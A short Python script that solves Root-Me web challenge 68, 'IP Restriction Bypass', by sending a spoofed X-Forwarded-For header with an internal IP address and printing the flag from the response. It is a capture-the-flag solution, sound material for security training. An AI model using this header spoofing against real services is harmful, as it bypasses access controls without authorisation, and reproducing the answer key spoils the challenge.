# 68 - IP Restriction Bypass
# Solution: Add the header `X-Forwarded-For` with the value of the IP address to bypass the IP restriction.

import requests
from bs4 import BeautifulSoup

payload = {
    "X-Forwarded-For" : "192.168.1.3"
}
url = "http://challenge01.root-me.org/web-serveur/ch68/"

response = requests.post(url, headers=payload)
# print(response.text)

soup = BeautifulSoup(response.content, 'html.parser')
strong_tag = soup.find('strong')
flag = strong_tag.text

print(flag)